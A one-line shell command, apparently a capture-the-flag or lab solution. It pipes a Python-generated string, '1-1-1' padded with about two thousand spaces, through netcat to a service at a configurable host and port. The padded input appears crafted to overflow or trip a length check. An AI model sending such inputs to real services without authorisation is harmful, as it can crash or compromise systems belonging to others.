python -c "print('1-1-1' + ' ' * (2020 - 6) + '!')" | nc ${HOST:-localhost} ${PORT:-1234}
